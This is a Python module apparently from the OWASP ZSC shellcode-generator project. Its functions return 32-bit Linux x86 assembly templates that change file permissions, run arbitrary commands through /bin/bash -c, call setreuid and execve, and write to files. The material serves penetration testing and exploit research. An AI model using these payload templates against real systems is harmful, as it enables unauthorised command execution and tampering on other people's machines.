#!/usr/bin/env python
'''
OWASP ZSC | ZCR Shellcoder
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/Ali-Razmjoo/OWASP-ZSC
http://api.z3r0d4y.com/
https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool-project[at]lists[dot]owasp[dot]org ]
'''
def chmod(perm_num,file_add):
	return '''push   $0x0f
pop    %%eax
%s
%s
mov    %%esp,%%ebx
int    $0x80
mov    $0x01,%%al
mov    $0x01,%%bl
int    $0x80'''%(perm_num,file_add)
def sys(command):
	return '''push   $0xb
pop    %%eax
cltd
push   %%edx
%s
mov    %%esp,%%esi
push   %%edx
push   $0x632d9090
pop    %%ecx
shr    $0x10,%%ecx
push   %%ecx
mov    %%esp,%%ecx
push   %%edx
push   $0x68
push   $0x7361622f
push   $0x6e69622f
mov    %%esp,%%ebx
push   %%edx
push   %%edi
push   %%esi
push   %%ecx
push   %%ebx
mov    %%esp,%%ecx
int    $0x80
'''%(str(command))
def exc(file_to_exec):
	return '''
mov    $0x46,%%al
xor    %%ebx,%%ebx
xor    %%ecx,%%ecx
int    $0x80
%s
mov    %%esp,%%ebx
xor    %%eax,%%eax
mov    $0xb,%%al
int    $0x80
mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
'''%(file_to_exec)
def write(null,file_name,content,length):
	return '''
push   $0x5
pop    %%eax
%s
%s
mov    %%esp,%%ebx
push   $0x4014141
pop    %%ecx
shr    $0x10,%%ecx
int    $0x80
mov    %%eax,%%ebx
push   $0x4
pop    %%eax
%s
mov %%esp,%%ecx
%s
int    $0x80
mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
'''%(str(null),str(file_name),str(content),str(length))

